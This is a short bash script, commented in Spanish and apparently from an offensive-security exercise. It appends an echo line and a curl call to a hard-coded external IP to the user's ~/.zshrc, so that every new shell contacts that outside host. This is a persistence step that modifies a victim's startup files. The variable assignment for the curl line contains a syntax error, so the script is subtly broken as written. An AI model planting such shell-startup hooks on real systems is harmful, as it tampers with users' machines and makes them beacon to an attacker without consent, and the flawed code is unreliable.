#!/bin/bash
#agregando cositas al .zshrc
MESSAGE="echo 'Hola, soy producto de una prueba de Offensive-Security'"
CURL= "curl http://104.248.64.180:8080"
# Verificar si el mensaje ya existe en el .zshrc
if ! grep -Fxq "$MESSAGE" ~/.zshrc; then
    echo "$MESSAGE" >> ~/.zshrc
fi
# Verificar si el curl ya existe en el -zshrc
if ! grep -Fxq "$CURL" ~/.zshrc; then
    echo "$CURL" >> ~/.zshrc
fi
